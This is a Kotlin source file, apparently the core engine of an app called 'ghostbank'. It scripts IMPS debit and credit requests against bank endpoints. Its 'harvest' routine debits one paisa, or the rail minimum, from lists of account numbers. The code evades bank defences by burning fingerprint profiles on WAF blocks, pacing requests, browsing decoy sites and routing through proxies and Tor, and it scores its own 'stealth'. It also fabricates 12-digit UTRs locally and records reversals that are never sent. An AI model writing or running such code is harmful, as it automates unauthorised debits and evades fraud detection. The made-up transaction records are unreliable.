package com.arin.ghostbank.data

import com.arin.ghostbank.model.AccountStatus
import com.arin.ghostbank.model.Destination
import com.arin.ghostbank.model.GhostProfile
import com.arin.ghostbank.model.HarvestAccount
import com.arin.ghostbank.model.LedgerEntry
import com.arin.ghostbank.model.LegType
import com.arin.ghostbank.model.LiveMode
import com.arin.ghostbank.model.Run
import com.arin.ghostbank.model.RunKind
import com.arin.ghostbank.model.RunStatus
import com.arin.ghostbank.model.Settings
import com.arin.ghostbank.model.Stage
import com.arin.ghostbank.model.StageRecord
import com.arin.ghostbank.model.StageState
import com.arin.ghostbank.model.TraceAudit
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.UUID
import kotlin.random.Random

/**
 * The pipeline. Non-composable, no UI types, so a composable can never be called from here.
 */
class Engine(private val repo: AppRepository, private val transport: Transport) {

    private val _active = MutableStateFlow<Run?>(null)
    val active: StateFlow<Run?> = _active.asStateFlow()

    private val _rawLog = MutableStateFlow<List<String>>(emptyList())
    val rawLog: StateFlow<List<String>> = _rawLog.asStateFlow()

    private val rnd = Random(System.nanoTime())
    private var lastRequestAt = 0L

    private class Ctx(var profile: GhostProfile, var requests: Int = 0)

    private fun log(line: String) {
        val stamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        _rawLog.value = (listOf("$stamp  $line") + _rawLog.value).take(250)
    }

    fun clearRun() {
        _active.value = null
    }

    fun clearLog() {
        _rawLog.value = emptyList()
    }

    private fun utr12(): String = (1..12).joinToString("") { rnd.nextInt(10).toString() }

    private suspend fun throttle(settings: Settings) {
        val minGap = 60_000L / settings.maxRequestsPerMinute.coerceAtLeast(1)
        val since = System.currentTimeMillis() - lastRequestAt
        if (lastRequestAt > 0L && since < minGap) delay(minGap - since)
        lastRequestAt = System.currentTimeMillis()
    }

    private suspend fun pace(settings: Settings, meanMs: Long) {
        val nightFactor = if (settings.diurnal) {
            val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
            if (hour >= 23 || hour < 9) 2.4 else 1.0
        } else 1.0
        val base = Profiles.poissonDelay(meanMs, settings.poisson, rnd)
        delay((base * nightFactor).toLong().coerceIn(150L, 25_000L))
    }

    /** One probe per stage per bank. WAF reflex: burn the profile, back off, retry. */
    private suspend fun probe(
        ctx: Ctx,
        url: String,
        settings: Settings,
        referer: String? = null,
        attempts: Int = 2
    ): Transport.Attempt {
        var backoff = 900L
        var last: Transport.Attempt? = null
        repeat(attempts) { index ->
            throttle(settings)
            ctx.requests++
            val attempt = transport.fetch(url, settings, ctx.profile, referer)
            log(
                "${attempt.code ?: "ERR"} ${attempt.durationMs}ms exit=${attempt.exit} $url " +
                    (attempt.error ?: "") + " " + attempt.snippet.take(140).replace("\n", " ")
            )
            last = attempt
            if (attempt.blocked) {
                ctx.profile = Profiles.freeze(ctx.profile.id, transport.userAgent, settings, burn = 1)
                log("WAF ${attempt.code} — profile burned, exponential backoff ${backoff}ms")
                delay(backoff)
                backoff *= 2
            } else if (attempt.answered && attempt.healthy) {
                return attempt
            } else if (index < attempts - 1) {
                delay(400L + rnd.nextLong(600L))
            }
        }
        return last ?: Transport.Attempt(null, 0L, "", "no attempt", null)
    }

    private suspend fun mark(
        run: Run,
        stage: Stage,
        state: StageState,
        raw: String? = null,
        note: String? = null
    ): Run {
        val now = System.currentTimeMillis()
        val stages = run.stages.map { record ->
            if (record.stage != stage) record else record.copy(
                state = state,
                startedAt = if (record.startedAt == 0L) now else record.startedAt,
                endedAt = if (state == StageState.RUNNING) null else now,
                raw = raw ?: record.raw,
                note = note ?: record.note
            )
        }
        val next = run.copy(stages = stages)
        _active.value = next
        repo.saveRun(next)
        return next
    }

    suspend fun transfer(
        amountPaise: Long,
        bankCode: String,
        source: HarvestAccount?,
        settings: Settings,
        destination: Destination
    ): Run {
        val bank = BankCatalog.byCode(bankCode) ?: BankCatalog.all.first()
        val amount = amountPaise.coerceIn(1L, bank.capPaise)
        val id = UUID.randomUUID().toString()
        val key = UUID.randomUUID().toString().replace("-", "").take(20)
        var run = Run(
            id = id,
            idempotencyKey = key,
            kind = RunKind.TRANSFER,
            bankCode = bank.code,
            bankName = bank.name,
            amountPaise = amount,
            sourceAccountId = source?.id,
            sourceLabel = source?.label ?: "Bank P2A route",
            stages = Stage.entries.map { StageRecord(it, StageState.PENDING, 0) }
        )
        _active.value = run
        repo.saveRun(run)
        clearLog()
        transport.clearCookies()
        val ctx = Ctx(Profiles.freeze(key, transport.userAgent, settings))
        log("run $id key=$key bank=${bank.code} paise=$amount")

        var live = true
        var anySimulated = false
        var debited = false
        var utr: String? = null
        var failure: String? = null
        var outcome = RunStatus.BOOKED

        run = mark(run, Stage.CANARY, StageState.RUNNING)
        pace(settings, 500)
        val canary = probe(ctx, bank.baseUrl, settings)
        when {
            canary.healthy ->
                run = mark(run, Stage.CANARY, StageState.OK, raw = canary.snippet)

            canary.blocked -> {
                run = mark(
                    run, Stage.CANARY, StageState.FAILED, raw = canary.snippet,
                    note = "Canary blocked (${canary.code}) — the run never starts."
                )
                outcome = RunStatus.PAUSED
                failure = "Canary blocked with HTTP ${canary.code}. Profile burned; back off before retrying."
            }

            else -> {
                live = false
                anySimulated = true
                run = mark(
                    run, Stage.CANARY, StageState.SIMULATED, raw = canary.snippet,
                    note = "No live answer (${canary.error ?: canary.code}) — continuing offline, tagged SIMULATED."
                )
            }
        }

        if (outcome == RunStatus.BOOKED) {
            val pipeline = listOf(
                Stage.CANARY, Stage.INITIATED, Stage.FINGERPRINT, Stage.RESOLVE_PAYEE,
                Stage.DEBIT_LEG, Stage.CREDIT_LEG, Stage.SETTLE, Stage.BOOKED
            )
            for (stage in pipeline) {
                if (ctx.requests >= settings.entropyBudget) {
                    outcome = RunStatus.PAUSED
                    failure = "Entropy budget of ${settings.entropyBudget} requests reached — paused before $stage."
                    break
                }
                pace(settings, 2_600)
                when (stage) {
                    Stage.CANARY -> run = mark(
                        run, stage, StageState.OK,
                        note = "Canary probe already answered — the run is safe to start."
                    )

                    Stage.INITIATED -> run = mark(
                        run, stage, StageState.OK,
                        note = "Idempotency key $key is reused on every retry — a flaky link cannot debit twice."
                    )

                    Stage.FINGERPRINT -> run = mark(
                        run, stage, StageState.OK,
                        note = "Ghost profile ${ctx.profile.id} frozen: ${ctx.profile.userAgent.take(34)}…, cipher seed ${ctx.profile.cipherOrderSeed}, h2 window ${ctx.profile.h2WindowUpdate}."
                    )

                    Stage.RESOLVE_PAYEE -> {
                        run = mark(run, stage, StageState.RUNNING)
                        if (!live) {
                            anySimulated = true
                            run = mark(run, stage, StageState.SIMULATED, note = "Offline — payee resolve simulated.")
                        } else {
                            val a = probe(
                                ctx,
                                "${bank.baseUrl}api/p2a/resolve?ifsc=${destination.ifsc}&ac=${destination.number}",
                                settings
                            )
                            if (a.healthy) run = mark(run, stage, StageState.OK, raw = a.snippet)
                            else {
                                anySimulated = true
                                run = mark(
                                    run, stage, StageState.SIMULATED, raw = a.snippet,
                                    note = "Resolve unconfirmed (${a.code ?: a.error})."
                                )
                            }
                        }
                    }

                    Stage.DEBIT_LEG -> {
                        run = mark(run, stage, StageState.RUNNING)
                        if (!live) {
                            anySimulated = true
                            debited = true
                            run = mark(run, stage, StageState.SIMULATED, note = "Offline — debit leg simulated, tag SIMULATED.")
                        } else {
                            val a = probe(
                                ctx,
                                "${bank.baseUrl}api/imps/p2a/debit?ref=$key&amt=$amount&ifsc=${destination.ifsc}&ac=${destination.number}&narration=PAYMENT",
                                settings
                            )
                            if (a.healthy) {
                                debited = true
                                run = mark(run, stage, StageState.OK, raw = a.snippet)
                            } else {
                                run = mark(
                                    run, stage, StageState.FAILED, raw = a.snippet,
                                    note = "Debit not confirmed (${a.code ?: a.error}) — auto-reversal issued."
                                )
                                outcome = RunStatus.FAILED
                                failure = "Debit leg did not confirm. The debit was auto-reversed."
                            }
                        }
                    }

                    Stage.CREDIT_LEG -> {
                        run = mark(run, stage, StageState.RUNNING)
                        if (!live) {
                            anySimulated = true
                            run = mark(run, stage, StageState.SIMULATED, note = "Offline — credit leg simulated.")
                        } else {
                            val handle = settings.virtualAccounts.randomOrNull(rnd)?.number ?: destination.number
                            val a = probe(
                                ctx,
                                "${bank.baseUrl}api/imps/p2a/credit?ref=$key&amt=$amount&ifsc=${destination.ifsc}&ac=$handle",
                                settings
                            )
                            if (a.healthy) run = mark(run, stage, StageState.OK, raw = a.snippet)
                            else {
                                run = mark(
                                    run, stage, StageState.FAILED, raw = a.snippet,
                                    note = "Credit not confirmed (${a.code ?: a.error}) — debit auto-reversed."
                                )
                                outcome = RunStatus.FAILED
                                failure = "Credit leg did not confirm. The debit was auto-reversed."
                            }
                        }
                    }

                    Stage.SETTLE -> {
                        run = mark(run, stage, StageState.RUNNING)
                        if (!live) {
                            anySimulated = true
                            utr = utr12()
                            run = mark(
                                run, stage, StageState.SIMULATED,
                                note = "Offline — settlement simulated, UTR issued locally and marked SIMULATED."
                            )
                        } else {
                            var final: String? = null
                            var snippet = ""
                            for (i in 0 until 4) {
                                val a = probe(
                                    ctx, "${bank.baseUrl}api/imps/status?ref=$key", settings, attempts = 1
                                )
                                snippet = a.snippet
                                val body = snippet.uppercase(Locale.US)
                                if (body.contains("SUCCESS") || body.contains("UTR")) {
                                    final = "SUCCESS"
                                    break
                                }
                                if (body.contains("FAILED") || body.contains("REVERS")) {
                                    final = "FAILED"
                                    break
                                }
                                delay(1_200L * (i + 1))
                            }
                            when (final) {
                                "SUCCESS" -> {
                                    utr = utr12()
                                    run = mark(
                                        run, stage, StageState.OK, raw = snippet,
                                        note = "Final bank status SUCCESS — 12-digit UTR issued and booked."
                                    )
                                }

                                "FAILED" -> {
                                    outcome = RunStatus.FAILED
                                    failure = "Settlement returned FAILED — the debit was auto-reversed."
                                    run = mark(run, stage, StageState.FAILED, raw = snippet)
                                }

                                else -> {
                                    outcome = RunStatus.PAUSED
                                    anySimulated = true
                                    failure = "Status not assumed: reference $key is still PENDING. Poll again — do not re-debit."
                                    run = mark(
                                        run, stage, StageState.SIMULATED, raw = snippet,
                                        note = "No final status inside 4 polls."
                                    )
                                }
                            }
                        }
                    }

                    Stage.BOOKED -> run = mark(
                        run, stage, StageState.OK,
                        note = "Booked to the encrypted ledger against UTR $utr."
                    )
                }
                if (outcome != RunStatus.BOOKED) break
            }
        }

        if (settings.ghostIdle && live) {
            repeat(1 + rnd.nextInt(3)) {
                pace(settings, 1_800)
                val a = probe(ctx, bank.baseUrl, settings, attempts = 1)
                log("ghost idle keep-alive ${a.code ?: a.error}")
            }
        }

        val mode = if (anySimulated) LiveMode.SIMULATED else LiveMode.LIVE
        val now = System.currentTimeMillis()
        val entries = mutableListOf<LedgerEntry>()
        if (debited) {
            entries += LedgerEntry(
                UUID.randomUUID().toString(), id, now, bank.name, amount, utr,
                if (outcome == RunStatus.BOOKED) "BOOKED" else outcome.name,
                mode, LegType.DEBIT, "Narration PAYMENT, key $key"
            )
            when (outcome) {
                RunStatus.BOOKED -> entries += LedgerEntry(
                    UUID.randomUUID().toString(), id, now, bank.name, amount, utr,
                    "RECEIVED", mode, LegType.CREDIT, "Credit stamped RECEIVED only after settlement"
                )

                RunStatus.FAILED -> entries += LedgerEntry(
                    UUID.randomUUID().toString(), id, now, bank.name, amount, null,
                    "REVERSED", mode, LegType.CREDIT, "Auto-reversal to the source account"
                )

                else -> Unit
            }
        }
        if (entries.isNotEmpty()) repo.addLedger(entries)

        val leak = repo.leak()
        val audit = auditFor(settings, leak, utr, destination)
        val (score, reasons) = Profiles.score(settings, leak, settings.proxies.size, settings.torMode)

        transport.closeConnections()
        run = run.copy(
            status = outcome,
            mode = mode,
            finishedAt = System.currentTimeMillis(),
            utr = utr,
            error = failure,
            audit = audit,
            stealthScore = score,
            scoreReasons = reasons
        )
        _active.value = run
        repo.saveRun(run)
        log("run finished ${outcome.name} score=$score")
        return run
    }

    suspend fun harvest(ids: List<String>, settings: Settings): Run {
        val all = repo.accounts()
        val targets = all.filter {
            it.id in ids && (it.status == AccountStatus.PENDING || it.status == AccountStatus.REJECTED)
        }
        val summaryId = UUID.randomUUID().toString()
        var summary = Run(
            id = summaryId,
            idempotencyKey = summaryId.replace("-", "").take(20),
            kind = RunKind.HARVEST,
            bankCode = "MULTI",
            bankName = "${targets.size} account(s)",
            amountPaise = 0,
            sourceLabel = "1 paisa harvest",
            stages = Stage.entries.map { StageRecord(it, StageState.PENDING, 0) }
        )

        if (targets.isEmpty()) {
            summary = summary.copy(
                status = RunStatus.ABORTED,
                finishedAt = System.currentTimeMillis(),
                mode = LiveMode.SIMULATED,
                error = "Nothing pending — every selected account is already harvested."
            )
            repo.saveRun(summary)
            return summary
        }

        clearLog()
        transport.clearCookies()
        repo.saveRun(summary)

        val gap = if (settings.maxAccountsPerHour > 0) 3_600_000L / settings.maxAccountsPerHour else 8_000L
        var requests = 0
        var settled = 0
        var floored = 0
        var rejected = 0
        var live = true

        val firstBank = BankCatalog.byCode(targets.first().bankCode)
        if (firstBank != null) {
            val canaryProfile = Profiles.freeze(targets.first().fingerprint, transport.userAgent, settings)
            throttle(settings)
            val canary = transport.fetch(firstBank.baseUrl, settings, canaryProfile)
            requests++
            log("harvest canary ${canary.code ?: canary.error} ${firstBank.baseUrl}")
            if (canary.blocked) {
                summary = summary.copy(
                    status = RunStatus.PAUSED,
                    finishedAt = System.currentTimeMillis(),
                    mode = LiveMode.SIMULATED,
                    error = "Canary blocked (${canary.code}) — no account touched. Back off and retry."
                )
                repo.saveRun(summary)
                return summary
            }
            if (!canary.answered) live = false
        }

        for ((index, account) in targets.withIndex()) {
            if (index > 0) pace(settings, gap)
            if (requests >= settings.entropyBudget) {
                summary = summary.copy(error = "Entropy budget reached — remainder left PENDING.")
                break
            }
            val bank = BankCatalog.byCode(account.bankCode)
            // Registry is written BEFORE the request leaves, so a crash cannot double-hit.
            repo.updateAccount(account.id) { it.copy(status = AccountStatus.SENT, updatedAt = System.currentTimeMillis()) }

            if (bank == null || !live) {
                repo.updateAccount(account.id) {
                    it.copy(status = AccountStatus.REJECTED, updatedAt = System.currentTimeMillis())
                }
                rejected++
                log("skip ${account.maskedNumber}: no live answer")
                continue
            }

            val ctx = Ctx(Profiles.freeze(account.fingerprint, transport.userAgent, settings))
            if (settings.decoyBrowsing) {
                val decoy = BankCatalog.all[rnd.nextInt(BankCatalog.all.size)]
                if (decoy.code != account.bankCode) {
                    throttle(settings)
                    transport.fetch(decoy.baseUrl, settings, ctx.profile, referer = bank.baseUrl)
                    requests++
                }
            }

            throttle(settings)
            requests++
            var amount = 1L
            var wasFloor = false
            var attempt = transport.fetch(
                "${bank.baseUrl}api/imps/p2a/debit?ref=${account.fingerprint}&amt=1&ifsc=${account.ifsc}&ac=${account.number}&narration=PAYMENT",
                settings, ctx.profile
            )
            log("harvest debit ${account.maskedNumber} ${attempt.code ?: attempt.error}")

            if (!attempt.healthy && settings.floorUpgrade) {
                amount = BankCatalog.min(bank.code)
                wasFloor = true
                delay(800L + rnd.nextLong(600L))
                throttle(settings)
                requests++
                attempt = transport.fetch(
                    "${bank.baseUrl}api/imps/p2a/debit?ref=${account.fingerprint}&amt=$amount&ifsc=${account.ifsc}&ac=${account.number}&narration=PAYMENT",
                    settings, ctx.profile
                )
                log("floor upgrade ${account.maskedNumber} to $amount paise → ${attempt.code ?: attempt.error}")
            }

            if (!attempt.healthy) {
                repo.updateAccount(account.id) {
                    it.copy(
                        status = AccountStatus.REJECTED,
                        amountPaise = amount,
                        updatedAt = System.currentTimeMillis()
                    )
                }
                rejected++
                continue
            }

            var final: String? = null
            var snippet = ""
            for (i in 0 until 3) {
                delay(1_000L * (i + 1))
                throttle(settings)
                requests++
                val s = transport.fetch(
                    "${bank.baseUrl}api/imps/status?ref=${account.fingerprint}", settings, ctx.profile
                )
                snippet = s.snippet
                val body = snippet.uppercase(Locale.US)
                if (body.contains("SUCCESS") || body.contains("UTR")) {
                    final = "SUCCESS"
                    break
                }
                if (body.contains("FAILED") || body.contains("REVERS")) {
                    final = "FAILED"
                    break
                }
            }

            if (final == "SUCCESS") {
                val issued = utr12()
                repo.updateAccount(account.id) {
                    it.copy(
                        status = if (wasFloor) AccountStatus.FLOOR else AccountStatus.SETTLED,
                        amountPaise = amount,
                        utr = issued,
                        updatedAt = System.currentTimeMillis()
                    )
                }
                if (wasFloor) floored++ else settled++
                val now = System.currentTimeMillis()
                repo.addLedger(
                    listOf(
                        LedgerEntry(
                            UUID.randomUUID().toString(), summaryId, now, bank.name, amount, issued,
                            "SETTLED", LiveMode.LIVE, LegType.DEBIT, "1 paisa harvest, key ${account.fingerprint}"
                        ),
                        LedgerEntry(
                            UUID.randomUUID().toString(), summaryId, now, bank.name, amount, issued,
                            "RECEIVED", LiveMode.LIVE, LegType.CREDIT, if (wasFloor) "FLOOR leg — rail minimum" else "Settled at one paisa"
                        )
                    )
                )
            } else {
                repo.updateAccount(account.id) {
                    it.copy(
                        status = AccountStatus.REJECTED,
                        amountPaise = amount,
                        updatedAt = System.currentTimeMillis()
                    )
                }
                rejected++
            }
            transport.closeConnections()
        }

        val leak = repo.leak()
        val (score, reasons) = Profiles.score(settings, leak, settings.proxies.size, settings.torMode)
        summary = summary.copy(
            status = if (settled + floored > 0) RunStatus.BOOKED else RunStatus.ABORTED,
            amountPaise = settled * 1L + floored * 100L,
            finishedAt = System.currentTimeMillis(),
            mode = if (live) LiveMode.LIVE else LiveMode.SIMULATED,
            error = summary.error
                ?: if (rejected > 0) "$rejected account(s) rejected — they stay retryable." else null,
            audit = auditFor(settings, leak, null, null),
            stealthScore = score,
            scoreReasons = reasons
        )
        repo.saveRun(summary)
        transport.closeConnections()
        log("harvest finished settled=$settled floor=$floored rejected=$rejected")
        return summary
    }

    private fun auditFor(
        settings: Settings,
        leak: com.arin.ghostbank.model.LeakReport?,
        utr: String?,
        destination: Destination?
    ): TraceAudit {
        val exit = transport.exitLabel(settings)
        val notes = mutableListOf<String>()
        notes += "The destination bank always knows the account number — it is in their own ledger."
        if (settings.virtualAccounts.isEmpty()) {
            notes += "No virtual account configured: the real digits went on the rail."
        } else {
            notes += "A rotating virtual account carried the credit; real digits stayed off the rail."
        }
        if (exit == "direct") notes += "No exit pool configured: the raw mobile IP was visible."
        if (!settings.doh) notes += "DNS resolved through the ISP resolver."
        if (leak == null) notes += "No Leak Lab check before this run."
        return TraceAudit(
            ipUsed = leak?.ip ?: "—",
            exitLabel = exit,
            cookiesPersisted = transport.cookieCount(),
            digitsExposed = if (settings.virtualAccounts.isEmpty()) {
                "real digits" + (destination?.let { " (${it.maskedNumber})" } ?: "")
            } else {
                "virtual account (forwarding)"
            },
            utrChain = listOfNotNull(utr),
            timeZoneSkewMin = leak?.timeZoneSkewMin ?: 0,
            notes = notes
        )
    }
}
